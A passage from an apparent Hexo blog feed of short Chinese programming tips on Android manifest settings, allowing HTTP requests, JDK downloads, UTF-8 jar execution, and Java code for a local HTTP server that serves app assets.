id="添加更新通知"><a href="#添加更新通知" class="headerlink" title="添加更新通知"></a>添加更新通知</h5><p>个人博客（又不是大佬，不可能有人订阅的<br><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="image">  </p><p>觉着这个功能不错，就添加了，参考这篇博客 </p><p><a href="https://yafine-blog.cn/posts/ebb2.html" target="_blank" rel="noopener">Hexo 博客订阅文章通知功能 | 过客～励む</a>  </p><p>注：可能提供商的原因？某些Chrome去广告插件会拦截这个，导致推送失效</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在应用详情页拉起应用内Activity</title>
      <link href="/2021/zai-ying-yong-xiang-qing-ye-la-qi-ying-yong-nei-activity/"/>
      <url>/2021/zai-ying-yong-xiang-qing-ye-la-qi-ying-yong-nei-activity/</url>
      
        <content type="html"><![CDATA[<p>安卓应用程序中的某些Activity可以直接从应用详情页跳转  </p><a id="more"></a>  <p>安卓设置里的应用详情页里有个清除全部应用数据，若不想应用内全部数据被清除，可以通过在 <code>application</code> 中配置  <code>android:manageSpaceActivity=&quot;&quot;</code> 来跳转到应用自定义的清理页面，同时应用详情里的 <code>清除全部数据</code> 按钮将会被替换为 <code>管理空间</code> </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:manageSpaceActivity</span>=<span class="string">"Activity名称"</span> &gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p><strong>跳转到应用内的设置</strong></p><p>通过在设置的Activity内添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">action</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:name</span>=<span class="string">"android.intent.action.APPLICATION_PREFERENCES"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">category</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>添加后可以在应用详情页的 <code>应用中的其他设置</code> 打开指定Activity</p><p>部分国内定制UI (如MIUI) 并不支持从应用详情页跳转应用内设置</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓隐藏应用程序后台卡片</title>
      <link href="/2021/an-zhuo-yin-cang-ying-yong-cheng-xu-hou-tai-qia-pian/"/>
      <url>/2021/an-zhuo-yin-cang-ying-yong-cheng-xu-hou-tai-qia-pian/</url>
      
        <content type="html"><![CDATA[<p>将应用程序在安卓的多任务列表隐藏  </p><a id="more"></a>  <p>在Activity中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:excludeFromRecents="true"</span><br></pre></td></tr></table></figure><p> <code>excludeFromRecents</code> 的值默认为 <code>false</code> ，会显示在后台列表</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jdk下载</title>
      <link href="/2021/jdk-xia-zai/"/>
      <url>/2021/jdk-xia-zai/</url>
      
        <content type="html"><![CDATA[<p>Oracle官网下载jdk目前需要登录帐号才能下载，略微有些麻烦了，想要直接下载可以到 华为开源镜像站 里去获取  </p><a id="more"></a>  <p><a href="https://repo.huaweicloud.com/java/jdk/" target="_blank" rel="noopener">https://repo.huaweicloud.com/java/jdk/</a>  </p><p><a href="https://repo.huaweicloud.com/java/jdk/8u192-b12/" target="_blank" rel="noopener">jdk8</a></p><p>在Linux下使用wget获取也很方便</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>以utf-8运行jar</title>
      <link href="/2021/yi-utf-8-yun-xing-jar/"/>
      <url>/2021/yi-utf-8-yun-xing-jar/</url>
      
        <content type="html"><![CDATA[<p>一些jar在Win默认编码下直接运行会有乱码，可以尝试以utf-8编码运行</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-Dfile.encoding=utf<span class="number">-8</span> -<span class="keyword">jar </span>xxx.<span class="keyword">jar</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓允许Http网络请求</title>
      <link href="/2021/an-zhuo-yun-xu-http-wang-luo-qing-qiu/"/>
      <url>/2021/an-zhuo-yun-xu-http-wang-luo-qing-qiu/</url>
      
        <content type="html"><![CDATA[<p>在高版本安卓中，谷歌限制了Http请求，需要改用https的网络请求  </p><a id="more"></a>  <p>解决方法：  </p><ul><li>改用https</li><li>调低targetSdk</li><li>在xml中添加network_security_config</li></ul><p>第三个方法：</p><p>新建 res\xml\network_security_config.xml 文件，添加下面内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时添加到manifest的application中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> &gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:networkSecurityConfig</span>=<span class="string">"@xml/network_security_config"</span> &gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://developer.android.google.cn/training/articles/security-config" target="_blank" rel="noopener">https://developer.android.google.cn/training/articles/security-config</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>本地Http服务</title>
      <link href="/2021/ben-di-http-fu-wu/"/>
      <url>/2021/ben-di-http-fu-wu/</url>
      
        <content type="html"><![CDATA[<p>安卓加载 <code>assets</code> 目录中的网页时，虽然可以用 <code>file:///android_asset/</code> 实现，但是一些网页的资源却不能正常加载，解决方法建一个本地Http服务器来实现网页加载  </p><a id="more"></a>  <p>下面直接贴代码  </p><p>com\xl\webserver\WebServer.java  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xl.webserver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebServer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用线程池，减少频繁创建线程的消耗。</span></span><br><span class="line"><span class="comment"> * 线程池</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">private</span> ExecutorService mExecutorService = <span class="keyword">null</span>;</span><br><span class="line"> <span class="keyword">private</span> ServerSocket mServerSocket;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">int</span> mPort = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">boolean</span> mIsAlive = <span class="keyword">true</span>;</span><br><span class="line"> <span class="keyword">private</span> Context context;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startServer</span><span class="params">(Context context, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.context = context;</span><br><span class="line">  mIsAlive = <span class="keyword">true</span>;</span><br><span class="line">  mPort = port;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建缓存类型的线程池</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  mExecutorService = Executors.newCachedThreadPool();</span><br><span class="line">  mExecutorService.execute(<span class="keyword">new</span> AcceptRunnable());</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器是否还活着</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAlive</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mIsAlive;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 等到所有的线程都处理完才关闭服务器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(mServerSocket!=<span class="keyword">null</span>)</span><br><span class="line">   mServerSocket.close();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">   e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  mIsAlive = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(mExecutorService!=<span class="keyword">null</span>)</span><br><span class="line">   mExecutorService.shutdown();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 立即关闭服务器，不会等到所有的线程都处理完。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdownNow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(mServerSocket!=<span class="keyword">null</span>)</span><br><span class="line">   mServerSocket.close();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">   e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  mIsAlive = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(mExecutorService!=<span class="keyword">null</span>)</span><br><span class="line">   mExecutorService.shutdownNow();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用于执行接受客户端连接的线程</span></span><br><span class="line"><span class="comment"> * 将接受客户端的操作也放入子线程中执行，这样就不会阻塞主线程。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">AcceptRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">try</span></span><br><span class="line">   &#123;</span><br><span class="line">    mServerSocket = <span class="keyword">new</span> ServerSocket(mPort);</span><br><span class="line">    System.out.println(<span class="string">"Web Server startup on "</span> + mPort);</span><br><span class="line">    <span class="keyword">while</span> (mIsAlive)</span><br><span class="line">    &#123;</span><br><span class="line">     Socket socket = mServerSocket.accept();</span><br><span class="line">     <span class="comment">// 通过线程池的方式来处理客户的请求</span></span><br><span class="line">     <span class="keyword">if</span>(mIsAlive)</span><br><span class="line">      mExecutorService.execute(<span class="keyword">new</span> Processor(context, socket));</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (IOException e)</span><br><span class="line">   &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com\xl\webserver\Processor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xl.webserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> folk.china.http.HTTPRequestException;</span><br><span class="line"><span class="keyword">import</span> folk.china.http.HTTPRequestHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理一个HTTP用户请求的线程类。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Processor</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PrintStream out;</span><br><span class="line">    <span class="keyword">private</span> InputStream input;</span><br><span class="line">    <span class="keyword">private</span> Context context;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 默认的服务器存放访问内容的目录D:\eclipse3.4\workspace03</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String WEB_ROOT = <span class="string">"/mnt/sdcard/www/"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Processor</span><span class="params">(Context context,Socket socket)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.context = context;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input = socket.getInputStream();</span><br><span class="line">            out = <span class="keyword">new</span> PrintStream(socket.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">String fileName = parse(input);</span></span><br><span class="line"><span class="comment">readFile(fileName);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                HTTPRequestHeader header = HTTPRequestHeader.parse(input);</span><br><span class="line">                System.out.println(header.toString());</span><br><span class="line">                readAssetsFile(header.mLocalUrl);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (HTTPRequestException e) &#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析客户机发过的所有HTTP请求，如果是符合HTTP协议内容的， 就分析出客户机所要访问文件的名字，并且返回文件名。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">parse</span><span class="params">(InputStream input)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(input));</span><br><span class="line">        String inputContent = in.readLine();</span><br><span class="line">        <span class="keyword">if</span> (inputContent == <span class="keyword">null</span> || inputContent.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            sendError(<span class="number">400</span>, <span class="string">"Client invoke error"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 分析客户请求的HTTP信息，分析出到底想访问哪个文件，</span></span><br><span class="line"><span class="comment">// 发过来的HTTP请求应该是三部分。</span></span><br><span class="line">        String request[] = inputContent.split(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">if</span> (request.length != <span class="number">3</span>) &#123;</span><br><span class="line">            sendError(<span class="number">400</span>, <span class="string">"Client invoke error"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 第一部分是请求的方法</span></span><br><span class="line">        String method = request[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 第二部分是请求的文件名</span></span><br><span class="line">        String fileName = request[<span class="number">1</span>];</span><br><span class="line"><span class="comment">// 第三部分是HTTP版本号</span></span><br><span class="line">        String httpVersion = request[<span class="number">2</span>];</span><br><span class="line">        System.out.println(<span class="string">"Method: "</span> + method + <span class="string">", file name: "</span> + fileName + <span class="string">", HTTP version: "</span> + httpVersion);</span><br><span class="line">        <span class="keyword">return</span> fileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理调用一个文件的请求</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFile</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file_root = <span class="keyword">new</span> File(Processor.WEB_ROOT, fileName);</span><br><span class="line">        String filename = <span class="keyword">null</span>;</span><br><span class="line">        String content_type = <span class="string">"text"</span>;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ((start = fileName.indexOf(<span class="string">'?'</span>)) &gt; <span class="number">0</span>) filename = fileName.substring(<span class="number">0</span>, start);</span><br><span class="line">        <span class="keyword">else</span> filename = fileName;</span><br><span class="line">        File file = <span class="keyword">new</span> File(Processor.WEB_ROOT + filename);</span><br><span class="line">        <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">            file = <span class="keyword">new</span> File(Processor.WEB_ROOT + filename, <span class="string">"index.html"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!file.isFile()) &#123;</span><br><span class="line">            sendError(<span class="number">404</span>, file.getPath() + <span class="string">" File Not Found"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 把文件的内容读取到in对象中。</span></span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        <span class="keyword">byte</span> content[] = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>) file.length()];</span><br><span class="line">        in.read(content);</span><br><span class="line">        out.println(<span class="string">"HTTP/1.0 200 sendFile"</span>);</span><br><span class="line">        <span class="keyword">if</span> (file.getName().endsWith(<span class="string">".html"</span>))</span><br><span class="line">            content_type = <span class="string">"text/html; charset=UTF-8"</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (file.getName().endsWith(<span class="string">".png"</span>))</span><br><span class="line">            content_type = <span class="string">"image/png"</span>;</span><br><span class="line">        out.println(<span class="string">"Content-Type: "</span> + content_type);</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">"Content-length: "</span> + content.length);</span><br><span class="line">        out.println();</span><br><span class="line">        out.write(content);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readAssetsFile</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  String filename = <span class="keyword">null</span>;</span><br><span class="line">  String content_type = <span class="string">"text"</span>;</span><br><span class="line">  <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ((start = fileName.indexOf(<span class="string">'?'</span>)) &gt; <span class="number">0</span>) filename = fileName.substring(<span class="number">0</span>, start);</span><br><span class="line">  <span class="keyword">else</span> filename = fileName;</span><br><span class="line"><span class="comment">//File file = new File(Processor.WEB_ROOT + filename);</span></span><br><span class="line"><span class="comment">//if (file.isDirectory()) &#123;</span></span><br><span class="line"><span class="comment">//file = new File(Processor.WEB_ROOT + filename, "index.html");</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!file.isFile()) &#123;</span></span><br><span class="line"><span class="comment">//sendError(404, file.getPath() + " File Not Found");</span></span><br><span class="line"><span class="comment">//return;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 把文件的内容读取到in对象中。</span></span><br><span class="line">        <span class="keyword">if</span>(filename.startsWith(<span class="string">"/"</span>))&#123;</span><br><span class="line">            filename = filename.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  InputStream in = context.getAssets().open(Processor.WEB_ROOT + filename);</span><br><span class="line">  <span class="keyword">byte</span>[] content = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">  in.read(content);</span><br><span class="line">  out.println(<span class="string">"HTTP/1.0 200 sendFile"</span>);</span><br><span class="line">  <span class="keyword">if</span> (filename.endsWith(<span class="string">".html"</span>))</span><br><span class="line">   content_type = <span class="string">"text/html; charset=UTF-8"</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (filename.endsWith(<span class="string">".png"</span>))</span><br><span class="line">   content_type = <span class="string">"image/png"</span>;</span><br><span class="line">  out.println(<span class="string">"Content-Type: "</span> + content_type);</span><br><span class="line"></span><br><span class="line">  